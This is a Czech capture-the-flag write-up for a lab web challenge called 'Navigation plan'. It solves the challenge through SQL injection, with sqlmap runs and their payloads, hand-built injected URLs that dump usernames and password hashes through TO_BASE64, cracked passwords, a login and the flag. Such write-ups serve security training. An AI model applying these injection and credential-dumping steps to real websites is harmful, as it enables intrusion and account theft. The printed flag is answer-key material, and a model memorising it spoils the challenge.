# Navigation plan

## Zadání

```
Ahoy, officer,

the chief officer was invited to a naval espresso by the captain and now they are both unfit for duty. The second officer is very busy and he has asked you to find out where are we heading according to the navigation plan.

May you have fair winds and following seas!

The navigation plan webpage is available at http://navigation-plan.cns-jv.tcc.

Hint: Details should contain the desired information.
```

## Řešení

Ze HTML zdrojového kódu stránky je patrný poměrně zvláštní způsob načítání obrázků:

```html
<img src="/image.png?type=data&amp;t=targets&amp;id=1" alt="Map for # Target 1">
```

Drobná změna GET parametru `t` zobrazí zajímavou chybu 
http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targes&id=1

```
Fatal error: Uncaught mysqli_sql_exception: Table 'navigation.targes' doesn't exist in /var/www/html/image.php:9 Stack trace: #0 /var/www/html/image.php(9): mysqli_query(Object(mysqli), 'SELECT data FRO...') #1 {main} thrown in /var/www/html/image.php on line 9
```

Jedná se tedy o SQL injection.

### Sqlmap

#### Výpis databází 

```bash
sqlmap --random-agent -u "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1" --level 5 --risk 3 --dbs --threads 

GET parameter 'type' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 1892 HTTP(s) requests:
---
Parameter: type (GET)
    Type: boolean-based blind
    Title: MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause
    Payload: type=data,(SELECT (CASE WHEN (6312=6312) THEN 1 ELSE 6312*(SELECT 6312 FROM INFORMATION_SCHEMA.PLUGINS) END))&t=targets&id=1

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: type=data OR (SELECT 1856 FROM(SELECT COUNT(*),CONCAT(0x717a766a71,(SELECT (ELT(1856=1856,1))),0x716b706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&t=targets&id=1

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: type=data AND (SELECT 4322 FROM (SELECT(SLEEP(5)))xpfE)&t=targets&id=1
---
[20:20:10] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.10, Apache, PHP
back-end DBMS: MySQL >= 5.0
[20:20:10] [INFO] fetching database names
[20:20:10] [WARNING] the SQL query provided does not return any output
[20:20:10] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[20:20:10] [INFO] fetching number of databases
[20:20:10] [INFO] resumed: 2
[20:20:10] [INFO] retrieving the length of query output
[20:20:10] [INFO] retrieved: 18
[20:20:21] [INFO] retrieved: information_schema             
[20:20:21] [INFO] retrieving the length of query output
[20:20:21] [INFO] retrieved: 10
[20:20:27] [INFO] retrieved: navigation             
available databases [2]:
[*] information_schema
[*] navigation
```

#### Tabulky v databázi `navigation`

```bash
sqlmap --random-agent -u "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1" --level 5 --risk 3 --tables -D navigation

Database: navigation
[3 tables]
+---------+
| files   |
| targets |
| users   |
+---------+
```

### Pokus o výpis tabulky `users`

```bash
sqlmap --random-agent -u "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1" --level 5 --risk 3 -D navigation -T users --dump

[20:31:55] [INFO] fetching columns for table 'users' in database 'navigation'
[20:31:55] [WARNING] the SQL query provided does not return any output
[20:31:55] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[20:31:55] [WARNING] unable to retrieve column names for table 'users' in database 'navigation'
do you want to use common column existence check? [y/N/q] y
which common columns (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/data/txt/common-columns.txt' (press Enter)
[2] custom
> 
[20:32:12] [INFO] checking column existence using items from '/usr/share/sqlmap/data/txt/common-columns.txt'
[20:32:12] [INFO] adding words used on web page to the check list
[20:32:12] [INFO] starting 4 threads
                                                                                                                                                                            
[20:34:56] [WARNING] no column(s) found
[20:34:56] [WARNING] unable to enumerate the columns for table 'users' in database 'navigation'
```

Pokus o výpis je tedy neúspěšný, ale alespoň víme že v databázi je tabulka `navigation.users`.
Zkusíme ručně jestli tabulka obsahuje klasické sloupce typu `username` a `password`.

### Získání uživatelských jmen a hesel

Pokus o výpis uživatelských jmen zobrazuje podivné znaky, ale zdá se že sloupec `username` skutečně existuje:
http://navigation-plan.cns-jv.tcc/image.png?type=username&t=navigation.users%20LIMIT%200,1%20%20--%20&id=2

Zajímavější je ale výpis LIMIT 3,4:
http://navigation-plan.cns-jv.tcc/image.png?type=username&t=navigation.users%20LIMIT%203,4%20%20--%20&id=2

```
Warning: Trying to access array offset on value of type null in /var/www/html/image.php on line 12
Deprecated: base64_decode(): Passing null to parameter #1 ($string) of type string is deprecated in /var/www/html/image.php on line 12
```

Takže je potřeba použít kódování Base64!

http://navigation-plan.cns-jv.tcc/image.png?type=TO_BASE64(username)&t=navigation.users%20LIMIT%200,1%20%20--%20&id=2
http://navigation-plan.cns-jv.tcc/image.png?type=TO_BASE64(username)&t=navigation.users%20LIMIT%201,2%20%20--%20&id=2
http://navigation-plan.cns-jv.tcc/image.png?type=TO_BASE64(username)&t=navigation.users%20LIMIT%202,3%20%20--%20&id=2

```
engeneer
captain
officer
```

http://navigation-plan.cns-jv.tcc/image.png?type=TO_BASE64(password)&t=navigation.users%20LIMIT%200,1%20%20--%20&id=2
http://navigation-plan.cns-jv.tcc/image.png?type=TO_BASE64(password)&t=navigation.users%20LIMIT%201,2%20%20--%20&id=2
http://navigation-plan.cns-jv.tcc/image.png?type=TO_BASE64(password)&t=navigation.users%20LIMIT%202,3%20%20--%20&id=2

```
15e2b0d3c33891ebb0f1ef609ec419420c20e320ce94c65fbc8c3312448eb225
7de22a47a2123a21ef0e6db685da3f3b471f01a0b719ef5774d22fed684b2537
6a4aed6869c8216e463054dcf7e320530b5dc5e05feae6d6d22a4311e3b22ceb
```

Na stránce https://crackstation.net získáme některá hesla:

```
15e2b0d3c33891ebb0f1ef609ec419420c20e320ce94c65fbc8c3312448eb225     sha256     123456789
7de22a47a2123a21ef0e6db685da3f3b471f01a0b719ef5774d22fed684b2537     sha256     $captainamerica$
6a4aed6869c8216e463054dcf7e320530b5dc5e05feae6d6d22a4311e3b22ceb     Unknown    Not found.
```

### Přihlášení

Na úvodní stránce se přihlásíme jako uživatel `captain` s heslem `$captainamerica$`
Vlajka je skryta v `Details` u `Target 4`.

## Vlajka

```
FLAG{fmIT-QkuR-FFUv-Zx44}
```
